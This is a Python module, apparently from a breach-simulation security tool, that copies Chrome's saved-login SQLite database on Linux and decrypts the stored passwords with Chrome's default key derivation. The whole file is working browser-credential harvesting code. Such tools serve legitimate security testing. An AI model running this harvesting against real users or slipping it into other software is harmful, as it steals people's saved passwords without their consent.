import logging
import os
import shutil
import sqlite3
from hashlib import pbkdf2_hmac
from itertools import chain
from typing import Collection, Iterator, Optional

from common.credentials import Credentials, EmailAddress, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .decrypt import decrypt_AES, decrypt_v80
from .linux_credentials_database_selector import DEFAULT_MASTER_KEY


logger = logging.getLogger(__name__)

AES_BLOCK_SIZE = 16
AES_INIT_VECTOR = b" " * 16

DB_TEMP_PATH = "/tmp/chrome.db"
DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"


class LinuxCredentialsDatabaseProcessor:
    def __init__(self):
        pass

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        self._decryption_key = pbkdf2_hmac(
            hash_name="sha1",
            password=DEFAULT_MASTER_KEY,
            salt=b"saltysalt",
            iterations=1,
            dklen=16,
        )
        credentials = chain.from_iterable(map(self._process_database_path, database_paths))
        return list(interruptible_iter(credentials, interrupt))

    def _process_database_path(
        self, database_path: BrowserCredentialsDatabasePath
    ) -> Iterator[Credentials]:
        if database_path.database_file_path.is_file():
            try:
                shutil.copyfile(database_path.database_file_path, DB_TEMP_PATH)

                conn = sqlite3.connect(DB_TEMP_PATH)
            except Exception:
                logger.exception(
                    "Error encounter while connecting to "
                    f"database: {database_path.database_file_path}"
                )
                os.remove(DB_TEMP_PATH)
                return

            try:
                yield from self._process_login_data(conn)
            except Exception:
                logger.exception(
                    "Error encountered while processing "
                    f"database {database_path.database_file_path}"
                )
            finally:
                conn.close()

            os.remove(DB_TEMP_PATH)

    def _process_login_data(self, connection: sqlite3.Connection) -> Iterator[Credentials]:
        for user, password in connection.execute(DB_SQL_STATEMENT):
            try:
                yield Credentials(
                    identity=self._get_identity(user), secret=self._get_password(password)
                )
            except Exception:
                continue

    def _get_identity(self, user: str):
        try:
            return EmailAddress(email_address=user)
        except ValueError:
            return Username(username=user)

    def _get_password(self, password: str) -> Optional[Password]:
        if self._password_is_encrypted(password):
            try:
                return Password(password=self._decrypt_password(password))
            except Exception:
                return None

        return Password(password=password)

    def _password_is_encrypted(self, password: str):
        return password[:3] == b"v10" or password[:3] == b"v11"

    def _decrypt_password(self, password: str) -> str:
        try:
            decrypted_password = self._chrome_decrypt(password, self._decryption_key)
            if decrypted_password != "":
                return decrypted_password

        except Exception:
            logger.exception("Failed to decrypt password")
            raise

        # If we get here, we failed to decrypt the password
        raise Exception("Password could not be decrypted.")

    def _chrome_decrypt(self, encrypted_value, key) -> str:
        try:
            return decrypt_AES(encrypted_value, key, AES_INIT_VECTOR, AES_BLOCK_SIZE)
        except UnicodeDecodeError:
            pass

        try:
            return decrypt_v80(encrypted_value, key)
        except UnicodeDecodeError:
            pass

        return ""
